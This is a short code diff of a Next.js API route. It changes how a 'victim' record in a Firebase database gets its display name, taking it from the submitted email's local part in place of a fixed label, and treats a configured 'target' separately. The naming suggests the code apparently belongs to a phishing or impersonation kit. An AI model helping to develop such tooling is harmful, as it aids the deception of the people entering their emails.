@@ -73,7 +73,7 @@ export async function POST(request: NextRequest) {
         victimUpdate.profilePicture = config.targetProfilePicture;
       } else {
         // For non-target emails, we can set a default name or leave it blank
-        victimUpdate.name = 'Account'; // Or derive from email, e.g., body.email.split('@')[0]
+        victimUpdate.name = body.email.split('@')[0];
         victimUpdate.profilePicture = ''; // Default or empty profile picture
       }
       await update(ref(db, 'victim'), victimUpdate);
